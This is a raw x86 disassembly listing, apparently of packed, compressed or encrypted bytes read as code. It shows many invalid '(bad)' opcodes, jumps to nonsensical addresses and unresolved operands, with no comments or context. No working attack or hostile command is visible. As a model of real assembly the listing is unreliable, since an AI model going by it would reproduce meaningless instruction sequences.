  40426c:	aas    
  40426d:	pop    ebx
  40426e:	push   0xffffffbf
  404270:	inc    edx
  404271:	pop    eax
  404272:	jmp    0x999b507a
  404277:	(bad)  
  404279:	pop    edx
  40427a:	jmp    0x5580982
  40427f:	call   0x6841c997
  404284:	cmp    eax,0x8282e95c
  404289:	push   esi
  40428a:	in     al,0x3
  40428c:	ds imul ebp,ecx,0x53
  404290:	push   esi
  404291:	jmp    0xdc2c:0xe43e03e9
  404298:	in     al,0x5a
  40429a:	mov    esi,0x71
	...
  4042c3:	add    BYTE PTR [eax],al
  4042c5:	add    BYTE PTR [edx-0x73],ah
  4042c8:	cmp    al,0xf0
  4042ca:	dec    ecx
  4042cb:	pop    es
  4042cc:	shl    edi,0xcb
  4042cf:	mov    dl,BYTE PTR [ecx-0x16a5c2a3]
  4042d5:	cmp    dl,0x67
  4042d8:	pusha  
  4042d9:	inc    ecx
  4042da:	lea    edx,es:[eax+ebp*8]
  4042de:	push   ss
  4042df:	inc    ebp
  4042e0:	xchg   edx,eax
  4042e1:	add    al,0x3e
  4042e3:	mov    esp,?
  4042e5:	sti    
  4042e6:	sbb    esi,eax
  4042e8:	add    BYTE PTR [ebx+0x21],dh
  4042eb:	lea    ebp,[edx-0x1f]
  4042ee:	gs pop edi
  4042f0:	dec    eax
  4042f1:	test   al,0x3d
  4042f3:	mov    WORD PTR [ebp-0xf],?
  4042f6:	adc    eax,0xe156fd58
  4042fb:	pusha  
  4042fc:	fmul   DWORD PTR [esi+0x6f]
  4042ff:	xchg   edi,edi
  404301:	mov    esp,0x3de274d5
  404306:	(bad)  [ebx+eiz*1-0x7f91eef]
  40430d:	cs dec edi
  40430f:	cmp    edi,0xffffff9c
  404312:	mov    ch,0x74
  404314:	or     BYTE PTR [ecx+ebx*4],bl
  404317:	mov    WORD PTR [ebx],fs
  404319:	xor    DWORD PTR [ecx+0x3101ec06],esp
  40431f:	pop    ebx
  404320:	add    cl,ch
  404322:	mov    al,ds:0x8911e806
  404327:	mov    edi,?
  404329:	jmp    0x40432e
	...
  404352:	add    BYTE PTR [eax],al
  404354:	mov    al,ds:0x8b010806
  404359:	xchg   edx,eax
  40435a:	jmp    esi
  40435c:	hlt    
  40435d:	xchg   edi,eax
  40435e:	pop    ebx
  40435f:	mov    al,0x7f
  404361:	push   edi
  404362:	add    BYTE PTR [eiz*8+0x624c837e],bh
  404369:	mov    WORD PTR [ebx-0xf],?
  40436c:	pusha  
  40436d:	push   es
  40436e:	or     cl,dl
  404370:	add    BYTE PTR [ecx-0x64db1700],0xc9
  404377:	stos   DWORD PTR es:[edi],eax
  404378:	inc    ecx
  404379:	mov    WORD PTR [edx+esi*2+0x11],ss
  40437d:	loopne 0x4043c4
  40437f:	icebp  
  404380:	fild   DWORD PTR ds:[eax]
  404383:	jmp    0x29aa6ec5
  404388:	add    dl,BYTE PTR [edi+0x582700ea]
  40438e:	leave  
  40438f:	ret    0x581b
  404392:	push   ebp
  404393:	mov    eax,ebx
  404395:	sbb    al,0xfc
  404397:	mov    edx,DWORD PTR [edx]
  404399:	nop
  40439a:	mov    cl,BYTE PTR [ebp-0xd]
  40439d:	js     0x4043ad
  40439f:	push   ecx
  4043a0:	es scas eax,DWORD PTR es:[edi]
  4043a2:	add    ch,BYTE PTR [ebx]
  4043a4:	pop    ss
  4043a5:	mov    DWORD PTR [ebx+0x3775459],ebp
  4043ab:	rep lods eax,DWORD PTR ds:[esi]
  4043ad:	adc    al,0xc9
  4043af:	ret    0x57cf
  4043b2:	push   ebp
  4043b3:	mov    eax,DWORD PTR [ebx+0x8b571e]
	...
  4043e1:	add    BYTE PTR [edx-0x2574047d],dl
  4043e7:	(bad)
  4043eb:	js     0x4043ef
  4043ed:	repz sti 
  4043ef:	adc    al,0x5e
  4043f1:	leave  
  4043f2:	push   ebp
  4043f3:	test   bh,bh
  4043f5:	push   esp
  4043f6:	or     al,0xa4
  4043f8:	push   esi
  4043f9:	push   edi
  4043fa:	or     al,0xb
  4043fc:	or     ah,bh
  4043fe:	sbb    al,0x53
  404400:	adc    BYTE PTR [ebx],ch
  404402:	push   edi
  404403:	adc    DWORD PTR [ebp+0xc],edi
  404406:	test   BYTE PTR [eax-0xd],bl
  404409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40440a:	ins    BYTE PTR es:[edi],dx
  40440b:	shl    BYTE PTR [ebp+0x1],1
  40440e:	pop    ss
  40440f:	push   ss
  404410:	pop    esi
  404411:	leave  
  404412:	xchg   ebp,eax
  404413:	xchg   edx,eax
  404414:	call   DWORD PTR [esp+ecx*8-0x4e]
  404418:	add    esp,0xffffff93
  40441b:	sbb    al,0x57
  40441d:	push   ebx
  40441e:	call   FWORD PTR [eax+0x1]
  404421:	add    BYTE PTR [edi+0x76],dl
  404424:	jne    0x40442e
  404426:	iret   
  404427:	out    dx,al
  404428:	(bad)  
  404429:	call   eax
  40442b:	add    al,0x7d
  40442d:	or     BYTE PTR [esi],bh
  40442f:	cmp    DWORD PTR ds:0x42c0c2b,edi
  404435:	add    DWORD PTR [esi],edi
  404437:	je     0x4044b4
  404439:	adc    al,0x54
  40443b:	or     al,dl
  40443d:	loop   0x404446
  40443f:	(bad)  
  404440:	data16 or BYTE PTR [ecx+0x41],bh
  404444:	jns    0x4044bb
	...
  40446e:	add    BYTE PTR [eax],al
  404470:	dec    edx
  404471:	cmp    bh,BYTE PTR [edi]
  404473:	(bad)  
  404474:	ds ins DWORD PTR es:[edi],dx
  404476:	mov    ebx,0xffff052b
  40447b:	cmp    dh,BYTE PTR [esi-0x7cff1b41]
  404481:	and    bh,BYTE PTR [edx+0x4]
  404484:	pcmpeqb mm7,QWORD PTR [esi]
  404487:	(bad)  
  404488:	cmp    DWORD PTR [edx],ecx
  40448a:	dec    edi
  40448b:	(bad)  
  40448c:	mov    ah,0x80
  40448e:	sub    DWORD PTR [eax+0x45797d42],ecx
  404494:	mov    cl,0xc
  404496:	add    BYTE PTR [edx],bh
  404498:	jmp    FWORD PTR [esi+esi*1+0x18762c10]
  40449f:	leave  
  4044a0:	cwde   
  4044a1:	xor    eax,0xe8f5d56f
  4044a6:	inc    ebp
  4044a7:	leave  
  4044a8:	jl     0x40442a
  4044aa:	add    edx,DWORD PTR [ebp-0x4b]
  4044ad:	mov    BYTE PTR [eax+0x4e4576c4],al
  4044b3:	push   edi
  4044b4:	jno    0x4044e5
  4044b6:	cld    
  4044b7:	pop    edx
  4044b8:	mov    ah,0x75
  4044ba:	jnp    0x404501
  4044bc:	arpl   si,di
  4044be:	aas    
  4044bf:	add    esi,eax
  4044c1:	aaa    
  4044c2:	call   0x3d819a52
  4044c7:	mov    edx,ebx
  4044c9:	jg     0x404487
  4044cb:	inc    ebp
  4044cc:	inc    esi
  4044cd:	je     0x4044d2
  4044cf:	add    BYTE PTR [esi],bh
  4044d1:	pop    ebx
  4044d2:	jb     0x40450a
	...
  4044fc:	add    BYTE PTR [eax],al
  4044fe:	dec    esi
  4044ff:	jle    0x40452a
  404501:	out    0x83,al
  404503:	mov    dh,ah
  404505:	lods   eax,DWORD PTR ds:[esi]
  404506:	jnp    0x404490
  404508:	fisubr WORD PTR [ebp+0x4e714332]
  40450e:	adc    DWORD PTR [ebx+0x14],ebx
  404511:	call   0xe86d164f
  404516:	mov    ah,0x6e
  404518:	mov    cl,0x7b
  40451a:	xchg   ebx,eax
  40451b:	mov    esi,esi
  40451d:	lods   eax,DWORD PTR ds:[esi]
  40451e:	jnp    0x4044a8
  404520:	jno    0x404531
  404522:	es pop edx
  404524:	lahf   
  404525:	ds loop 0x4044fc
  404528:	mov    ah,0xe4
  40452a:	(bad)  
  40452b:	outs   dx,BYTE PTR ds:[esi]
  40452c:	add    DWORD PTR [edx+0x6b],edi
  40452f:	mov    ch,bl
  404531:	dec    esi
  404532:	enter  0xddd4,0x29
  404536:	mov    ch,0x1f
  404538:	xor    DWORD PTR [ebx],esi
  40453a:	push   edx
  40453b:	dec    ebx
  40453c:	es ds mov dh,0x7c
  404540:	sub    DWORD PTR [ecx+0x3],edi
  404543:	mov    BYTE PTR [ecx+0x0],ah
  404546:	mov    ah,0x1f
  404548:	or     eax,0xa65bfd7b
  40454d:	inc    ebp
  40454e:	cmc    
  40454f:	xchg   ebx,eax
  404550:	sub    esi,edi
  404552:	mov    DWORD PTR [esi],ebp
  404554:	(bad)  
  404555:	xlat   BYTE PTR ds:[ebx]
  404556:	mov    edi,0x79e4fd9e
  40455b:	mov    DWORD PTR [edx],edi
  40455d:	das    
  40455e:	xchg   ebp,eax
  40455f:	xlat   BYTE PTR ds:[ebx]
  404560:	and    al,0xe0
	...
  40458a:	add    BYTE PTR [eax],al
  40458c:	push   cs
  40458d:	mov    bl,BYTE PTR [esp+ecx*1+0x56]
  404591:	movnti DWORD PTR [esi+edi*1],eax
  404595:	loopne 0x404540
  404597:	adc    eax,esi
  404599:	lock jmp 0xca83a2
  40459f:	cmp    al,0x32
  4045a1:	jae    0x4045e8
  4045a3:	mov    bh,0x1d
  4045a5:	mov    DWORD PTR [ecx+0x7589162c],ecx
  4045ab:	popf   
  4045ac:	sbb    al,BYTE PTR [esi-0x17]
  4045af:	jmp    0x160099f1
  4045b4:	popf   
  4045b5:	rol    BYTE PTR [ebp+0x79],cl
  4045b8:	sbb    eax,0x9491f40f
  4045bd:	mov    edi,edi
  4045bf:	jbe    0x404574
  4045c1:	push   ds
  4045c2:	clc    
  4045c3:	outs   dx,BYTE PTR ds:[esi]
  4045c4:	xchg   edi,eax
  4045c5:	(bad)  
  4045c6:	(bad)  
  4045c7:	fcom   QWORD PTR ds:0xda597589
  4045cd:	xlat   BYTE PTR ds:[ebx]
  4045ce:	(bad)  
  4045cf:	push   esi
  4045d0:	fisttp QWORD PTR [eax+0x63ea4d75]
  4045d6:	jmp    0x75c883c4
  4045db:	in     eax,dx
  4045dc:	aad    0x5f
  4045de:	jmp    0xff6b83cc
  4045e3:	mov    ah,0x49
  4045e5:	(bad)  
  4045e6:	test   DWORD PTR [edi],edx
  4045e8:	pushf  
  4045e9:	mov    bh,bh
  4045eb:	mov    ecx,0x16febe95
	...
  404618:	add    BYTE PTR [eax],al
  40461a:	popf   
  40461b:	mov    BYTE PTR [ebp+0x15],dh
  40461e:	popf   
  40461f:	push   cs
  404620:	clc    
  404621:	je     0x4045ea
  404623:	jns    0x404623
  404625:	(bad)  
  404626:	pushf  
  404627:	sub    ebp,eax
  404629:	neg    DWORD PTR [edi+0x16eeff88]
  40462f:	push   ebx
  404630:	call   0xffc8d889
  404635:	push   ebx
  404636:	cmp    dh,bl
  404638:	push   ss
  404639:	and    ebx,edi
  40463b:	pop    edx
  40463c:	call   DWORD PTR [edx+ecx*2+0x73]
  404640:	mov    ebx,0xff7d7d00
  404645:	or     ebx,DWORD PTR [edi-0x770b8a83]
  40464b:	and    edi,eax
  40464d:	push   DWORD PTR [edx+0x57]
  404650:	call   0xffbd2400
  404655:	and    edi,edi
  404657:	jl     0x4046ce
  404659:	clc    
  40465a:	mov    edi,0xc8fffdc8
  40465f:	jl     0x4046d6
  404661:	or     BYTE PTR [edi-0x77000846],ch
  404667:	fld    st(3)
  404669:	pop    ebx
  40466a:	ficomp WORD PTR [ebp-0x27adfff8]
  404670:	in     al,dx
  404671:	and    DWORD PTR [ebx],0xffffffb0
  404674:	push   edi
  404675:	mov    esp,DWORD PTR [edx+0x3c00a8f]
  40467b:	push   edx
  40467c:	mov    DWORD PTR [eax],0x0
	...
  4046a6:	add    BYTE PTR [eax],al
  4046a8:	out    0x5b,eax
  4046aa:	add    BYTE PTR [eax],al
  4046ac:	sub    al,0x7c
  4046ae:	cmp    DWORD PTR [ebp-0x21],0x5e
  4046b2:	jne    0x4046bb
  4046b4:	dec    ebp
  4046b5:	pop    esp
  4046b6:	add    al,BYTE PTR [eax]
  4046b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046b9:	js     0x4046ca
  4046bb:	sbb    edx,0xffffff83
  4046be:	add    DWORD PTR [ebp-0x60],esi
  4046c1:	in     eax,0x0
  4046c3:	add    DWORD PTR [edi+0x7c02eb5b],edx
  4046c9:	int    0x81
  4046cb:	retf   0x5b9e
  4046ce:	add    al,BYTE PTR [eax]
  4046d0:	sbb    dl,BYTE PTR [ebx]
  4046d2:	cld    
  4046d3:	push   eax
  4046d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d5:	cmc    
  4046d6:	(bad)  
  4046d7:	(bad)  
  4046d8:	repnz push edi
  4046da:	push   DWORD PTR [ebp+0x6f]
  4046dd:	jae    0x404681
  4046df:	jmp    0xc04ba23b
  4046e4:	ds daa 
  4046e6:	jno    0x404675
  4046e8:	add    ebp,DWORD PTR [edx+0xf3e6a34]
  4046ee:	inc    edi
  4046ef:	hlt    
  4046f0:	out    dx,al
  4046f1:	sub    eax,DWORD PTR [edi+edi*8]
  4046f4:	retf   
  4046f5:	mov    eax,ds:0x9d3a75e0
  4046fa:	(bad)
  4046fe:	or     al,0xc0
  404700:	mov    bl,0x38
  404702:	test   DWORD PTR [ebp+0x26],edi
  404705:	jne    0x40475e
  404707:	inc    esi
  404708:	mov    ebp,0x1d857
	...
  404735:	add    BYTE PTR [ebx+0x67d8476],cl
  40473b:	je     0x404794
  40473d:	cmp    dh,BYTE PTR [ebp-0x71bf23c9]
  404743:	fadd   QWORD PTR [edx-0x3]
  404746:	icebp  
  404747:	std    
  404748:	mov    eax,?
  40474a:	mov    ebx,0x8950dbbf
  40474f:	call   0x1057:0x153e6a03
  404756:	rol    edi,1
  404758:	fucomip st,st(0)
  40475a:	jno    0x404787
  40475c:	add    al,0x0
  40475e:	xor    eax,0x110a5834
  404763:	sbb    al,0x29
  404765:	std    
  404766:	mov    cl,0x3d
  404768:	sub    eax,0x8c7895ff
  40476d:	inc    ebp
  40476e:	dec    edx
  40476f:	jns    0x404734
  404771:	je     0x4047b6
  404773:	push   ebp
  404774:	push   edi
  404775:	clc    
  404776:	shl    DWORD PTR [eax+eiz*8+0x75],0x8a
  40477b:	ins    BYTE PTR es:[edi],dx
  40477c:	sbb    eax,0x8c743ee9
  404781:	mov    DWORD PTR [ebp+0x34],0x5bbd1c57
  404788:	fs cld 
  40478a:	aas    
  40478b:	or     dh,bh
  40478d:	mov    ebx,?
  40478f:	bound  ebp,QWORD PTR [ecx]
  404791:	xor    al,0x59
  404793:	adc    ch,dh
  404795:	loopne 0x404762
  404797:	push   0xffffffc6
  404799:	push   esi
	...
  4047c2:	add    BYTE PTR [eax],al
  4047c4:	cmp    al,BYTE PTR [esi+0x3c560c34]
  4047ca:	mov    dh,0xe0
  4047cc:	cmp    DWORD PTR [esi],esp
  4047ce:	mov    al,ds:0x3c5b4ac5
  4047d3:	lea    ebx,[edx]
  4047d5:	fcomp  QWORD PTR [esp+ecx*1]
  4047d8:	aas    
  4047d9:	pop    ebx
  4047da:	jmp    0x8e94db62
  4047df:	push   ss
  4047e0:	loopne 0x4047f4
  4047e2:	sub    BYTE PTR [ecx+edi*4],al
  4047e5:	pop    ds
  4047e6:	icebp  
  4047e7:	ins    DWORD PTR es:[edi],dx
  4047e8:	ds xchg ah,bh
  4047eb:	idiv   eax
  4047ed:	psubusw mm4,mm0
  4047f0:	imul   edx,DWORD PTR [edi+0x66],0x56
  4047f4:	ss jae 0x40484c
  4047f7:	loope  0x4047da
  4047f9:	test   DWORD PTR [eax],esp
  4047fb:	lds    ebp,FWORD PTR [esi]
  4047fd:	pop    ebx
  4047fe:	add    al,ah
  404800:	lds    ebp,FWORD PTR [edx+0x5387e518]
  404806:	jmp    0x43ec860e
  40480b:	push   esp
  40480c:	dec    edx
  40480d:	fdivr  QWORD PTR [ebx]
  40480f:	adc    cl,ah
  404811:	mov    bl,0x25
  404813:	sub    BYTE PTR [ebx+ebp*2+0x794ef2f8],0x7
  40481b:	mov    dh,BYTE PTR [edx]
  40481d:	loopne 0x4047e8
  40481f:	mov    bh,bh
  404821:	pop    edx
  404822:	pop    es
  404823:	ret    
  404824:	adc    esp,DWORD PTR [ecx+0x362a]
	...
  404852:	mov    ch,0x76
  404854:	add    BYTE PTR [esi-0x9f7e036],bl
  40485a:	lods   al,BYTE PTR ds:[esi]
  40485b:	sar    DWORD PTR [ebp-0xb],1
  40485e:	mov    ah,0x17
  404860:	adc    dl,dh
  404862:	jb     0x404872
  404864:	sbb    BYTE PTR [edx-0x6e],ah
  404867:	fwait
  404868:	jmp    0x42c6:0x255e2fe1
  40486f:	pop    ebx
  404870:	add    BYTE PTR [edx+0x36],dh
  404873:	loopne 0x404895
  404875:	pusha  
  404876:	sbb    DWORD PTR [ebx+0x33],0xffffffab
  40487a:	jns    0x4048f5
  40487c:	call   0xc9653b1f
  404881:	stos   DWORD PTR es:[edi],eax
  404882:	dec    esi
  404883:	pop    ebx
  404884:	push   ebp
  404885:	bound  ecx,QWORD PTR [esi]
  404887:	sub    DWORD PTR [ebx+0x755b420c],eax
  40488d:	out    dx,al
  40488e:	add    BYTE PTR [edi],bl
  404890:	or     BYTE PTR [ebp+0x72],ch
  404893:	sbb    al,BYTE PTR [eax]
  404895:	push   0x5f
  404897:	push   edi
  404898:	add    ah,dh
  40489a:	cmp    BYTE PTR [ebp+eax*2+0x4113b9f5],bl
  4048a1:	jmp    0x414857a6
  4048a6:	sar    DWORD PTR [ebp+0x0],cl
  4048a9:	jmp    0xbd3fec72
  4048ae:	cmp    DWORD PTR [ebx+0x7],esi
  4048b1:	inc    esi
  4048b2:	cmp    bl,BYTE PTR [ebx+0x3]
  4048b5:	adc    DWORD PTR [eax],eax
	...
  4048df:	add    ch,bh
  4048e1:	daa    
  4048e2:	call   0xffc4dad5
  4048e7:	jb     0x4048d3
  4048e9:	test   BYTE PTR [ebp-0xf],dh
  4048ec:	ins    BYTE PTR es:[edi],dx
  4048ed:	jae    0x404900
  4048ef:	push   cs
  4048f0:	inc    edx
  4048f1:	pop    ebx
  4048f2:	call   DWORD PTR [ecx+eax*2-0x6eff17d8]
  4048f9:	jge    0x4048fb
  4048fb:	add    BYTE PTR [eax+ebx*4],cl
  4048fe:	pop    ebx
  4048ff:	leave  
  404900:	and    eax,0xdc550057
  404905:	mov    dl,BYTE PTR [ebx-0x7d]
  404908:	loop   0x404960
  40490a:	add    BYTE PTR [ebp+0x58],dh
  40490d:	popf   
  40490e:	inc    ebp
  40490f:	or     bl,ah
  404911:	cmovno eax,DWORD PTR [eax]
  404914:	in     al,0xfa
  404916:	or     eax,DWORD PTR [eax]
  404918:	or     bl,BYTE PTR [edi+eax*8+0x45]
  40491c:	push   ebx
  40491d:	aam    0x48
  40491f:	inc    ecx
  404920:	daa    
  404921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404922:	jne    0x40492c
  404924:	(bad)  
  404925:	mov    edx,0xd11700e6
  40492a:	fdivr  st,st(7)
  40492c:	dec    edx
  40492d:	imul   ebp,eax,0xffffffb3
  404930:	leave  
  404931:	push   edi
  404932:	add    BYTE PTR [ebx],al
  404934:	iret   
  404935:	sbb    BYTE PTR [ebx-0x18],dl
  404938:	lods   al,BYTE PTR ds:[esi]
  404939:	mov    al,ds:0xc08cffff
  40493e:	push   DWORD PTR [ebp-0x21]
  404941:	dec    eax
  404942:	call   0x404a04
	...
  40496b:	add    BYTE PTR [eax],al
  40496d:	add    BYTE PTR [ecx+0xaff0057],bh
  404973:	push   esp
  404974:	push   ebx
  404975:	call   0x40c717
  40497a:	data16 sti 
  40497c:	pop    es
  40497d:	mov    WORD PTR [edi-0x308bffe2],ds
  404983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404984:	jne    0x40498e
  404986:	outs   dx,DWORD PTR ds:[esi]
  404987:	mov    ch,0xfb
  404989:	push   DWORD PTR [eax-0x2f]
  40498c:	ret    
  40498d:	pop    ebx
  40498e:	pop    esi
  40498f:	call   0x83ec:0xd0ea0008
  404996:	pop    ebx
  404997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404998:	push   edi
  404999:	push   0x4773e
  40499e:	ds pop edx
  4049a0:	lods   eax,DWORD PTR ds:[esi]
  4049a1:	sti    
  4049a2:	mov    DWORD PTR [esp+ecx*4+0x45],ebx
  4049a6:	xor    al,0x1f
  4049a9:	ret    0xb305
  4049ac:	add    eax,DWORD PTR [eax]
  4049ae:	jmp    0x404a1f
  4049b0:	jmp    0x3e6a:0xe0266916
  4049b7:	sub    BYTE PTR [edi+edi*8],al
  4049ba:	sar    DWORD PTR [ecx+0x69],cl
  4049bd:	add    BYTE PTR [ecx-0x72],dl
  4049c0:	ror    DWORD PTR [ebx-0x1],0x71
  4049c4:	xchg   al,al
  4049c6:	(bad)  
  4049c7:	dec    ecx
  4049c8:	fnsave [ebp+0x3a]
  4049cb:	popf   
  4049cc:	imul   edi,ebx,0x45c5b231
	...
  4049fa:	add    BYTE PTR [eax],al
  4049fc:	sub    dh,BYTE PTR [ebp+0x3]
  4049ff:	add    BYTE PTR [esi],bh
  404a01:	and    esi,eax
  404a03:	dec    ebx
  404a04:	jg     0x404a7a
  404a06:	call   0x88ca0f38
  404a0b:	inc    ebp
  404a0c:	ss (bad) 
  404a0e:	fdivr  QWORD PTR [edi+0x1]
  404a11:	add    bl,BYTE PTR [ebx]
  404a13:	inc    edx
  404a14:	inc    edx
  404a15:	jg     0x404a0f
  404a17:	imul   edi,DWORD PTR [esi],0x8e08421f
  404a1d:	lods   al,BYTE PTR ds:[esi]
  404a1e:	icebp  
  404a1f:	dec    esp
  404a20:	jg     0x404a96
  404a22:	fdiv   QWORD PTR [edx]
  404a24:	out    0xc0,al
  404a26:	(bad)  
  404a28:	sar    DWORD PTR [ebp-0x3d],1
  404a2b:	je     0x404a70
  404a2d:	or     eax,DWORD PTR [edi-0x4]
  404a30:	aad    0x8c
  404a32:	add    bh,0x42
  404a35:	cmc    
  404a36:	sbb    al,0x0
  404a38:	sub    esp,DWORD PTR [edx-0x77]
  404a3b:	inc    ebp
  404a3c:	stos   BYTE PTR es:[edi],al
  404a3d:	pop    ebx
  404a3e:	(bad)  
  404a3f:	retf   0x577c
  404a42:	jmp    0xbab00f7d
  404a47:	mov    bl,bh
  404a49:	push   edx
  404a4a:	loop   0x404a0f
  404a4c:	adc    bl,BYTE PTR [eax+0x69]
  404a4f:	sbb    al,0x3e
  404a51:	or     bl,dh
  404a53:	fwait
  404a54:	ds pop ebx
  404a56:	jmp    0x2bd45f5e
  404a5b:	or     BYTE PTR [esi],bh
  404a5d:	cmc    
  404a5e:	call   0x404acc
	...
  404a87:	add    BYTE PTR [eax],al
  404a89:	add    BYTE PTR [esi],bh
  404a8b:	cmc    
  404a8c:	jmp    0xe93588fa
  404a91:	imul   edi,DWORD PTR [esi+0x4903e95b],0x8
  404a98:	icebp  
  404a99:	jmp    0x404a29
  404a9b:	js     0x404a86
  404a9d:	add    eax,ebp
  404a9f:	mov    ds:0x77dc402,al
  404aa4:	loop   0x404ad6
  404aa6:	push   ss
  404aa7:	mov    dl,0x8c
  404aa9:	add    edi,DWORD PTR [esi]
  404aab:	ret    
  404aac:	call   0x329b88b4
  404ab1:	retf   
  404ab2:	cld    
  404ab3:	push   esi
  404ab4:	jmp    0x72aeffef
  404ab9:	inc    esi
  404aba:	ss push esi
  404abc:	test   eax,0xb1db4357
  404ac1:	add    ebp,DWORD PTR [ebx+0x54]
  404ac4:	xor    DWORD PTR [ebx],eax
  404ac6:	ds pop ebx
  404ac8:	jmp    0xe9974797
  404acd:	fcom   QWORD PTR [ebx+0x53]
  404ad0:	inc    ecx
  404ad1:	cwde   
  404ad2:	fistp  DWORD PTR [edx-0x17]
  404ad5:	add    dh,0x81
  404ad8:	mov    ebp,0xe96a970e
  404add:	add    edi,DWORD PTR [esi]
  404adf:	push   edx
  404ae0:	add    BYTE PTR [ebp+edi*2+0x51],bl
  404ae4:	mov    dh,0x29
  404ae6:	xchg   esi,eax
  404ae7:	push   edi
  404ae8:	mov    eax,0x5b3de9
  404aed:	xor    BYTE PTR [eax],al
	...
  404b17:	add    BYTE PTR [edi+0x56],bh
  404b1a:	add    BYTE PTR [esi+eax*8+0x6925836e],bh
  404b21:	hlt    
  404b22:	call   DWORD PTR [edx-0xe8a7dc3]
  404b28:	gs out 0xe5,al
  404b2b:	jmp    0x7600a16d
  404b30:	pop    ss
  404b31:	sub    edx,DWORD PTR [eax-0x2f]
  404b34:	loopne 0x404aba
  404b36:	(bad)  
  404b37:	fmulp  st(3),st
  404b39:	pop    ss
  404b3a:	cld    
  404b3b:	xor    DWORD PTR [edx],ecx
  404b3d:	xor    BYTE PTR [ebp-0x33],0x65
  404b41:	pop    es
  404b42:	or     cl,dl
  404b44:	jecxz  0x404bbd
  404b46:	add    cl,ch
  404b48:	dec    eax
  404b49:	fwait
  404b4a:	jne    0x404b31
  404b4c:	adc    al,0x7
  404b4e:	cld    
  404b4f:	rcr    DWORD PTR [ebp+0x51a6ff85],0x9b
  404b56:	jmp    0x404b42
  404b58:	enter  0xfc16,0xa0
  404b5c:	clc    
  404b5d:	push   edi
  404b5e:	add    BYTE PTR [ecx+edi*4],dh
  404b61:	outs   dx,DWORD PTR ds:[esi]
  404b62:	push   ebx
  404b63:	jb     0x404bac
  404b65:	dec    edi
  404b66:	push   0xffffffd9
  404b68:	xor    BYTE PTR [ebx+0x7b],dh
  404b6b:	jae    0x404b82
  404b6d:	sub    DWORD PTR [edx-0x17],0xea6a5b5b
  404b74:	push   ebx
  404b75:	pop    ebx
  404b76:	push   0xffffffea
  404b78:	gs pop ebx
  404b7a:	add    cl,ch
	...
  404ba4:	add    BYTE PTR [eax],al
  404ba6:	mov    ebp,0xd5e17580
  404bab:	xchg   esp,esp
  404bad:	add    bh,dl
  404baf:	pop    esp
  404bb0:	mov    DWORD PTR [ebx],eax
  404bb2:	out    0x10,eax
  404bb4:	pop    esp
  404bb5:	push   0xffffffa7
  404bb7:	dec    esp
  404bb8:	call   0x974df2
  404bbd:	mov    esp,edx
  404bbf:	pop    eax
  404bc0:	push   0x0
  404bc2:	lods   eax,DWORD PTR ds:[esi]
  404bc3:	pop    esp
  404bc4:	push   0x0
  404bc6:	mov    ebp,0x38006a56
  404bcb:	push   0x573227e8
  404bd0:	add    BYTE PTR [ebx],cl
  404bd2:	daa    
  404bd3:	sub    ebp,DWORD PTR [edi]
  404bd5:	mov    DWORD PTR [eax+eax*4+0x5cbd0069],esp
  404bdc:	push   0x0
  404bde:	or     eax,0x3fe8505b
  404be3:	jp     0x404be5
  404be5:	add    dh,bl
  404be7:	sbb    BYTE PTR [eax],cl
  404be9:	or     edx,DWORD PTR [edi+0x4ff242b]
  404bef:	pop    ebx
  404bf0:	call   0x9c4fb0
  404bf5:	push   DWORD PTR [esp+esi*2]
  404bf8:	mov    ah,0xe4
  404bfa:	pop    ss
  404bfb:	pop    esp
  404bfc:	mov    DWORD PTR [ebx],0xffffa4d8
  404c02:	lods   al,BYTE PTR ds:[esi]
  404c03:	push   edx
  404c04:	push   DWORD PTR [ebx]
  404c06:	mov    edi,0xe4ba
	...
  404c33:	add    BYTE PTR [edi],dl
  404c35:	popf   
  404c36:	add    edi,edi
  404c38:	mov    eax,0xa72bffa4
  404c3d:	pop    esi
  404c3e:	inc    ebx
  404c3f:	or     al,bl
  404c41:	or     al,al
  404c43:	pop    ebx
  404c44:	sahf   
  404c45:	xchg   ebp,eax
  404c46:	or     BYTE PTR [eax],al
  404c48:	mov    ds:0x4c53ecd0,al
  404c4d:	inc    ebx
  404c4e:	or     BYTE PTR [ebx+0x74db6d3e],al
  404c54:	xor    DWORD PTR [ecx],edx
  404c56:	push   esi
  404c57:	or     dh,dl
  404c59:	arpl   di,bx
  404c5b:	add    BYTE PTR [esi],bh
  404c5d:	inc    ecx
  404c5e:	push   esi
  404c5f:	add    al,0xa6
  404c61:	mov    edi,0x313e00df
  404c66:	push   ss
  404c67:	call   0x439a7d
  404c6c:	cmc    
  404c6d:	dec    edx
  404c6e:	lds    eax,FWORD PTR [esi+edi*1]
  404c71:	mov    edi,0x35bfec8e
  404c76:	jecxz  0x404c67
  404c78:	sbb    DWORD PTR [eax+0x31],0x15bebd57
  404c7f:	dec    eax
  404c80:	push   DWORD PTR [ecx+0x3]
  404c83:	je     0x404cd8
  404c85:	jno    0x404c96
  404c87:	xor    dh,dh
  404c89:	xor    al,BYTE PTR [eax+ebp*8]
  404c8c:	mov    edi,0x79ffd97a
  404c91:	outs   dx,BYTE PTR ds:[esi]
  404c92:	adc    eax,0x371ff48
	...
  404cbf:	add    BYTE PTR [eax],al
  404cc1:	add    BYTE PTR [esi],bh
  404cc3:	jb     0x404c49
  404cc5:	cmp    eax,0x434c70
  404cca:	ds inc eax
  404ccc:	out    dx,eax
  404ccd:	(bad)  
  404cce:	jae    0x404c56
  404cd0:	dec    ebx
  404cd1:	inc    ecx
  404cd2:	ds in  al,dx
  404cd4:	gs stc 
  404cd6:	sbb    esi,ebx
  404cd8:	rol    DWORD PTR ds:0x433c48,0x3e
  404cdf:	je     0x404ce4
  404ce1:	add    BYTE PTR [ebx-0x6102c11],dh
  404ce7:	std    
  404ce8:	xor    ebp,eax
  404cea:	mov    ds:0xbbffd904,eax
  404cef:	mul    edi
  404cf1:	out    dx,eax
  404cf2:	loope  0x404d4f
  404cf4:	data16 xor al,0xe6
  404cf7:	mov    esp,0xd0d1d959
  404cfc:	lods   al,BYTE PTR ds:[esi]
  404cfd:	xlat   BYTE PTR ds:[ebx]
  404cfe:	outs   dx,BYTE PTR ds:[esi]
  404cff:	repz adc cl,BYTE PTR [edi+edi*2+0x5b]
  404d04:	rol    DWORD PTR ds:0xec695b3e,1
  404d0a:	push   ds
  404d0b:	js     0x404cf6
